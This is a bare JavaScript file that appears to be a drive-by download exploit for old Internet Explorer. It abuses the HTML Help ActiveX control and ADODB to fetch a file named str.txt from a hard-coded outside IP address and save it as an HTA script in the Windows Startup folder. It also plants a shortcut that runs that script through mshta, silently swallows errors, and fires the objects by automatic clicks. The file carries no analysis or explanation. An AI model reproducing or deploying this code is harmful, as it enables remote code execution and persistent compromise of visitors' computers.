
document.write(unescape('\r<object id=h classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11%3E<param name=Command value=ShortCut%3E<param name=Item1 value=,mshta,C:/Docume~1/AllUse~1/StartM~1/Programs/Startup/qwe.hta%3E</object%3E\r<OBJECT id=M classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11%3E<PARAM name=Command value=Close%3E</OBJECT%3E'));document.close();
try{
	var Conn = new ActiveXObject("ADODB.Connection");
	strConn = "";
	strConn += "Driver={Microsoft Text Driver (*.txt; *.csv)};";
	strConn += "Dbq=http://207.44.236.46/;";
	strConn += "Extensions=asc,csv,tab,txt;";
	strConn += "Persist Security Info=False;";
	Conn.Open(strConn);
	var sql = "SELECT * FROM str.txt";
	rs = Conn.execute(sql);
	var rs = new ActiveXObject("ADODB.recordset");
	rs.Open ("SELECT * from str.txt", Conn);
	rs.Save ("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\qwe.hta", 0);
	rs.close();
	Conn.close();
 }
catch(e){}
h.Click(); 
M.Click();



